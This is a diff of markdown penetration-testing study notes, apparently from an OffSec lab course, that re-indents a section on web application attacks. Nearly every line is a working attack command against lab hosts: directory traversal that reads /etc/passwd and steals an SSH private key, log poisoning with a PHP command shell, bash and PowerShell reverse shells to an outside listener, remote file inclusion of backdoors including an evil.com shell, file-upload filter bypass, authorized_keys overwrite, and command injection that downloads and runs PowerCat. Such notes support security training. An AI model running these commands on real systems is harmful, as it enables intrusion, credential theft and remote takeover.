@@ -368,61 +368,61 @@
         ...))</script>" --proxy 127.0.0.1:8080
         ```  
         XSS stored in the WordPress DB. Login WP as admin, then click the visitor plugins
-        
+
 ### 9. Common Web Application attacks
-    - **Directory traversal**: access files outside of the web root by using relative paths (gathering info like credentials or keys that lead to system access)  
-      - `ls ../`: root system
-      - `ls ../../`: backward to 2 previous directories 
-      - absolute path: `cat /home/kali/etc/passwd`  
-      - relative path: `cat ../../etc/pwd`: move 2 directories back to root file
-      - extra ../sequence: `cat ../../../../../../../../../../../etc/passwd`
-      - hovering the site and find "http://mountaindesserts.com/meteor/index.php?page=admin.php"  
-      - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
+   - **Directory traversal**: access files outside of the web root by using relative paths (gathering info like credentials or keys that lead to system access)  
+     - `ls ../`: root system
+     - `ls ../../`: backward to 2 previous directories 
+     - absolute path: `cat /home/kali/etc/passwd`  
+     - relative path: `cat ../../etc/pwd`: move 2 directories back to root file
+     - extra ../sequence: `cat ../../../../../../../../../../../etc/passwd`
+     - hovering the site and find "http://mountaindesserts.com/meteor/index.php?page=admin.php"  
+     - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
         The output of /etc/passwd shows a user called "offsec"
-      - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
-      - `ssh -i dt_key -p 2222 offsec@mountaindesserts.com`: connect SSH from stolen private key
-      - `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`: URL encoding ../
-    - **File inclusion vulnerabilities**: allow us to “include” a file in the application’s running code.
-      - **Local file inclusion (LFI)** Includes files from the local server filesystem. E.g http://target.com/index.php?page=../../../../etc/passwd
-        - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`: Log entry of Apache’s access.log. Response incude user agent info  
-        - `<?php echo system($_GET['cmd']); ?>`: modify user agent header to include PHP snippet
-        - `../../../../../../../../../var/log/apache2/access.log&cmd=ps`: execute the command. output to access.log
-        - `../../../../../../../../../var/log/apache2/access.log&cmd=la%20-la`: URL encoding to bypass the bad request error of space
-        - `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`: shell or `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`: bash reverse shell
-        - `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`: encode the special chr with URL encoding
-        - before we send the request, start Netcat listener on port 4444. it will receive the incoming reverse shell from the target system `nc -nvlp 4444`
-        - target run on "XAMPP", apache logs found in C:\xampp\apache\logs\
-      - **PHP wrappers** can be used to represent and access local or remote filesystems. Use this to bypass filters or obtain code execution via File Inclusion vulnerabilities.
-        - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`: “php://filter” to include unencoded admin.php
-        - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`: “php://filter” to include base64 encoded admin.php
-        - `echo <base64 encoded text> | base64 -d`: Decoding the base64 encoded content of admin.php. Decooded data contains MySQL credentials
-        - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`: Usage of the “data://” wrapper to execute ls
-        - `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` output: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
-        - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`: bypass filter system command
-        - data:// will not work in a default PHP installation. To exploit it, the "allow_url_include" setting needs to be enabled
-      - **Remote file inclusion (RFI)** : include files from a remote system over HTTP or SMB. E.g http://target.com/index.php?page=http://attacker.com/shell.txt
-        - Requires allow_url_include=On in PHP config  
-        - PHP webshell locates in kali "/usr/share/webshells/php/"  
-        - remote file must access by target system. Use Python3 http.server to start a web server `/usr/share/webshells/php/$ python3 -m http.server 80` or GitHub accessible file
-        - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`: Exploiting RFI with a PHP backdoor and execution of ls
-        - shell.txt `<?php system($_GET['cmd']); ?>` then run `http://target.com/index.php?page=http://evil.com/shell.txt&cmd=id`
-    - File upload vulnerabilities
-      - scenarios: directory traversal + overwrite authorized_keys; file upload XXE or XSS; macros in docx.  
-      - file upload + code execution to obtain reverse shell  
-      - **upload txt file** (acceped) > bypass php file extension (.phps, .php7, pHP)  
-      - **execute command** `curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir`  
-      - kali webshells at **"/usr/share/webshells/"**
-      - step 2: netcat listener `nc -nvlp 4444` while listening 
-      - step 3: PowerShell one-liner to encode the reverse shell  
-      - step 4: execute the base64 encoded reverse shell oneliner
-      ```
-      curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-
-      enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
-      dAAuAFMAbwBjAGsAZQB0
-      ...
-      AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
-      GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
-      ```
+     - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
+     - `ssh -i dt_key -p 2222 offsec@mountaindesserts.com`: connect SSH from stolen private key
+     - `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`: URL encoding ../
+   - **File inclusion vulnerabilities**: allow us to “include” a file in the application’s running code.
+     - **Local file inclusion (LFI)** Includes files from the local server filesystem. E.g http://target.com/index.php?page=../../../../etc/passwd
+       - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`: Log entry of Apache’s access.log. Response incude user agent info  
+       - `<?php echo system($_GET['cmd']); ?>`: modify user agent header to include PHP snippet
+       - `../../../../../../../../../var/log/apache2/access.log&cmd=ps`: execute the command. output to access.log
+       - `../../../../../../../../../var/log/apache2/access.log&cmd=la%20-la`: URL encoding to bypass the bad request error of space
+       - `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`: shell or `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`: bash reverse shell
+       - `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`: encode the special chr with URL encoding
+       - before we send the request, start Netcat listener on port 4444. it will receive the incoming reverse shell from the target system `nc -nvlp 4444`
+       - target run on "XAMPP", apache logs found in C:\xampp\apache\logs\
+     - **PHP wrappers** can be used to represent and access local or remote filesystems. Use this to bypass filters or obtain code execution via File Inclusion vulnerabilities.
+       - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`: “php://filter” to include unencoded admin.php
+       - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`: “php://filter” to include base64 encoded admin.php
+       - `echo <base64 encoded text> | base64 -d`: Decoding the base64 encoded content of admin.php. Decooded data contains MySQL credentials
+       - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`: Usage of the “data://” wrapper to execute ls
+       - `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` output: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+       - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`: bypass filter system command
+       - data:// will not work in a default PHP installation. To exploit it, the "allow_url_include" setting needs to be enabled
+     - **Remote file inclusion (RFI)** : include files from a remote system over HTTP or SMB. E.g http://target.com/index.php?page=http://attacker.com/shell.txt
+       - Requires allow_url_include=On in PHP config  
+       - PHP webshell locates in kali "/usr/share/webshells/php/"  
+       - remote file must access by target system. Use Python3 http.server to start a web server `/usr/share/webshells/php/$ python3 -m http.server 80` or GitHub accessible file
+       - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`: Exploiting RFI with a PHP backdoor and execution of ls
+       - shell.txt `<?php system($_GET['cmd']); ?>` then run `http://target.com/index.php?page=http://evil.com/shell.txt&cmd=id`
+     - **File upload vulnerabilities**
+       - scenarios: directory traversal + overwrite authorized_keys; file upload XXE or XSS; macros in docx.  
+       - file upload + code execution to obtain reverse shell  
+       - **upload txt file** (acceped) > bypass php file extension (.phps, .php7, pHP)  
+       - **execute command** `curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir`  
+       - kali webshells at **"/usr/share/webshells/"**
+       - step 2: netcat listener `nc -nvlp 4444` while listening 
+       - step 3: PowerShell one-liner to encode the reverse shell  
+       - step 4: execute the base64 encoded reverse shell oneliner
+         ```
+         curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-
+         enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
+         dAAuAFMAbwBjAGsAZQB0
+         ...
+         AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
+         GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+         ```
       - trial and error tricks: upload file 2 times (file already exists then burte force, error for language/web tech)  
       - **modify the filename** `../../../../../test.txt` in burp request  
       - overwrite the authorized_keys (non executable file)    
@@ -431,19 +431,19 @@
         - `./../../../../../../root/.ssh/authorized_key` upload it using the relative path (burp intercept the request and modify the filename > forward)  
         - `rm ~/.ssh/known_hosts`: avoid error that cannot verify the host key saved previously  
         - `ssh -p 2222 -i fileup root@mountaindesserts.com`: use our private key to ssh
-    - Command injection  
-      - git clone https://gitlab.com/exploit-database/exploitdb.git (skip this step)  
-      - bad commands detected (ipconfig), try git
-      - `curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive` : %3B is semi colon, windows use 1 ampersand  
-      - identify the commands are executed by PowerShell or CMD  
-      - `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`: Code Snippet to check where our code is executed  
-      - `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`: URL encoding. Output shows PowerShell  
+   - **Command injection**  
+     - git clone https://gitlab.com/exploit-database/exploitdb.git (skip this step)  
+     - bad commands detected (ipconfig), try git
+     - `curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive` : %3B is semi colon, windows use 1 ampersand  
+     - identify the commands are executed by PowerShell or CMD  
+     - `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`: Code Snippet to check where our code is executed  
+     - `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`: URL encoding. Output shows PowerShell  
       
-      - `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`use PowerCat to create a reverse shell  
-      - `python3 -m http.server 80`
-      - `nc -nvlp 4444`  
-      - `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell`: Command to download PowerCat and execute a reverse shell  
-      - `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive`  
+     - `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`use PowerCat to create a reverse shell  
+     - `python3 -m http.server 80`
+     - `nc -nvlp 4444`  
+     - `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell`: Command to download PowerCat and execute a reverse shell  
+     - `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive`  
 
 ### 10. SQL injection attacks
 ### 11. Phishing Basics
